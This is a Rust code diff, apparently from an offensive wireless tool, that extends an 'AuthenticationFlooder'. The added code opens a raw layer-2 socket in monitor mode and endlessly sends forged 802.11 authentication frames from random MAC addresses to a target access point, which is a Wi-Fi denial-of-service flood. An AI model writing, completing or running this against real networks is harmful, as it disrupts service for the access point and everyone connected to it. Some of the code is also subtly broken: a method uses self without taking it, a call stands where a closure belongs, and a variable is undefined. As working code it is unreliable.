@@ -1,8 +1,11 @@
 use std::{thread, time::Duration};
 use crate::arg_parser::{AuthArgs, parse_mac};
 use crate::dissectors::BeaconDissector;
+use crate::generators::RandValues;
 use crate::iface::InterfaceManager;
+use crate::pkt_builder::PacketBuilder;
 use crate::sniffer::PacketSniffer;
+use crate::sockets::Layer2RawSocket;
 use crate::utils::abort;
 
 
@@ -27,9 +30,10 @@ impl AuthenticationFlooder {
     pub fn execute() {
         InterfaceManager::enable_monitor_mode(&self.iface);
         
-        if !self.args.bssid {
-            let bssid = self.resolve_bssid();
-        }
+        let bssid = self.args.bssid.unwrap_or_else(self.resolve_bssid());
+        self.send_endlessly(bssid);
+        
+        InterfaceManager::disable_monitor_mode(&iface);
     }
 
 
@@ -67,6 +71,19 @@ impl AuthenticationFlooder {
         
         InterfaceManager::disable_monitor_mode(&iface);
         abort("It was not possible to resolve BSSID. Try again or set a BSSID")
+    }
+
+
+
+    fn send_endlessly(&self, bssid: [u8; 6]) {
+        let rand    = RandValues::new();
+        let builder = PacketBuilder::new();
+        let socket  = Layer2RawSocket::new(&self.iface); 
+
+        loop {
+            let pkt = builder.auth_802_11(rand.get_random_mac(), bssid);
+            socket.send(pkt);
+        }
     }
 
 }
